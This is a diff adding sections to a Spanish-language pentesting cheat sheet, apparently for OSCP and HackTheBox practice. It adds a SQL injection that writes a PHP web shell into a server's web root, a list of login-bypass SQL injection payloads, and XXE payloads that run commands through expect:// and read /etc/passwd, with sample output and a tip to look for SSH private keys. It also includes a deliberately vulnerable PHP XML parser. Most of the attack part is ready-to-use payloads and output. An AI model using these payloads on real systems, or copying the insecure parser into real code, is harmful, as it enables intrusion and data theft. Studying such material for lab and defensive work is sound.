@@ -43,6 +43,7 @@
        * [ASP/ASPX Reverse Shell](#asp-aspx-reverse-shell)
        * [NoTCPShell](#notcpshell) 
        * [Bypass File Upload Filtering](#bypass-file-upload-filtering)
+       * [XML External Entity Injection](#xml-external-entity-injection)
      * [Pentesting Linux](#pentesting-linux)
         * [Tratamiento de la TTY](#tratamiento-de-la-tty)
         * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
@@ -1709,6 +1710,53 @@ Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vía e
 
 Para técnicas de bypassing consultar el siguiente [enlace](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
 
+En caso de querer ejecutar comandos sobre el sistema, podemos aprovechar que desde consultas **sql** se pueden exportar archivos para generar el nuestro malicioso. Para ello, aplicaríamos la siguiente sintaxis a modo de ejemplo:
+
+```bash
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+```
+
+A continuación, un Payload de pruebas a realizar para los logins una vez hagamos la convencional **' or '1'='1**:
+
+```bash
+-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+
+```
+
 #### Shellshock
 
 Buenas máquinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la máquina **Shocker** y la máquina **Beep** de HackTheBox.
@@ -1923,6 +1971,128 @@ Add-Type Application/x-httpd-php .miextension
 ```
 
 De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensión **.miextension**, será interpretado como un archivo PHP.
+
+#### XML External Entity Injection
+
+Para practicar podemos jugar con las máquinas **Aragog** y **DevOops** de **HackTheBox**. Antes que nada quiero citar que es necesario conocer la estructura XML que hay por detrás a la hora de interpretar el content, me explico. Supongamos que tras subir un archivo XML, la web nos muestra el siguiente Output:
+
+```bash
+User: s4vitar
+Password: myPassword
+```
+
+Esto ha sido así dado que previamente de alguna forma se nos ha avisado de que las sub-etiquetas a definir en nuestro archivo XML son **User** y **Password**, así como una etiqueta principal **creds** que englobe a estas. Esto nos permite llevar a cabo un ataque como el que describiré a continuación. 
+
+En un principio, estaríamos enviando el siguiente archivo XML:
+
+```bash
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <creds>
+       <User>s4vitar</user>
+       <Pass>myPassword</pass>
+    </creds>
+```
+
+Conociendo por tanto la estructura, podríamos decidir enviar un contenido como el siguiente:
+
+```bash
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [ <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+    <creds>
+       <User>&xxe;</user>
+       <Pass>myPassword</pass>
+    </creds>
+```
+
+A la hora de listar el Output desde la web, nos encontraríamos con el siguiente resultado:
+
+```bash
+User: www-data
+Password: myPassword
+```
+
+Esto ha sido así dado que estamos jugando con el _wrapper_ **expect**. Hay casos en los que puede que no se logre ejecutar comandos en el sistema, en tal caso podríamos probar a leer archivos de la siguiente forma:
+
+```bash
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [ <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <creds>
+       <User>&xxe;</user>
+       <Pass>myPassword</pass>
+    </creds>
+```
+
+Donde tal y como se podrá predecir, en el campo **User** se listará el contenido del fichero **/etc/passwd**. Una idea aquí es visualizar si para algunas de los usuarios existentes en base a la visualización del recurso anteriormente visto, bajo el directorio **.ssh** podemos encontrarnos con una clave privada de acceso por SSH para usarla como fichero de identificación, de esta forma... lograríamos acceder al sistema sin proporcionar contraseña alguna.
+
+Otro ejemplo práctico así como modo de hacer el mismo procedimiento es el siguiente. Supongamos un servicio Apache, esta vez no tenemos la posibilidad de subir archivos, sin embargo contamos por detrás con la siguiente estructura:
+
+```bash
+<?php 
+    libxml_disable_entity_loader (false); 
+    $xmlfile = file_get_contents('php://input'); 
+    $dom = new DOMDocument(); 
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+    $creds = simplexml_import_dom($dom); 
+    $user = $creds->user; 
+    $pass = $creds->pass; 
+    echo "You have logged in as user $user";
+?> 
+```
+
+Como es de obviar, se nos pide una estructura XML como la siguiente:
+
+```bash
+<creds>
+    <user>Ed</user>
+    <pass>mypass</pass>
+</creds>
+```
+
+En este caso varía un poco la petición, pero podemos hacerla desde terminal:
+
+```bash
+$~ curl -d @xml.txt http://localhost/xml_injectable.php 
+```
+
+El concepto al fin y al cabo es el mismo, el servidor responde lo siguiente:
+
+```bash
+You have logged in as user Ed
+```
+
+Y a raíz de esto, podemos elaborar una estructura XML maliciosa como la siguiente:
+
+```bash
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
+
+¿Qué conseguimos con esto?, obtener lo siguiente:
+
+```bash
+$~ curl -d @xml.txt http://localhost/xml_injectable.php 
+
+You have logged in as user root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+```
 
 ### Pentesting Linux
 
